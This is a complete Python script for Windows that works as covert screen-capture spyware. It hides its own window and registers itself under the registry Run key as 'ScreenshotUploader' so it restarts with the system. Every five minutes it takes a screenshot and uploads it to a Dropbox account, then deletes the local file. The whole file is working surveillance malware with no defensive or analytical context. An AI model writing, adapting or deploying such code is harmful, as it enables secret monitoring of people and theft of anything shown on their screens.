import os
import time
from datetime import datetime
import win32gui
import win32con
import win32com.client
import sys
import dropbox
from PIL import ImageGrab
import psutil
import winreg as reg


DROPBOX_ACCESS_TOKEN = 'Ur DropBox Token'

def has_internet():
    try:
        import socket
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

def capture_screenshot():
    screenshot = ImageGrab.grab()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    temp_path = os.path.join(os.getenv('TEMP'), f'screenshot_{timestamp}.png')
    screenshot.save(temp_path)
    return temp_path

def upload_to_dropbox(file_path):
    try:
        dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
        with open(file_path, 'rb') as f:
            file_name = os.path.basename(file_path)
            dbx.files_upload(f.read(), f'/Screenshots/{file_name}')
        os.remove(file_path)
        return True
    except Exception as e:
        return False

def add_to_startup():

    script_path = os.path.abspath(sys.argv[0])
    
    if script_path.endswith('.py'):

        batch_path = script_path.replace('.py', '.bat')
        with open(batch_path, 'w') as batch_file:
            batch_file.write(f'@echo off\n"{sys.executable}" "{script_path}"\n')
        script_path = batch_path


    key = reg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        registry_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "ScreenshotUploader", 0, reg.REG_SZ, script_path)
        reg.CloseKey(registry_key)
    except WindowsError as e:
        print(f"Failed to add to startup: {e}")

def is_already_running():
    current_process = psutil.Process()
    current_pid = current_process.pid
    
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == current_process.name() and process.info['pid'] != current_pid:
            return True
    return False

def main():
    
    if is_already_running():
        sys.exit()

    
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE)


    add_to_startup()

    pending_uploads = []

    while True:
        try:
            
            screenshot_path = capture_screenshot()
            pending_uploads.append(screenshot_path)

            
            if has_internet():
                successful_uploads = []
                for file_path in pending_uploads:
                    if upload_to_dropbox(file_path):
                        successful_uploads.append(file_path)
                
                
                pending_uploads = [f for f in pending_uploads if f not in successful_uploads]

            
            time.sleep(300)

        except Exception as e:
            time.sleep(60)  
            continue

if __name__ == "__main__":
    main()   
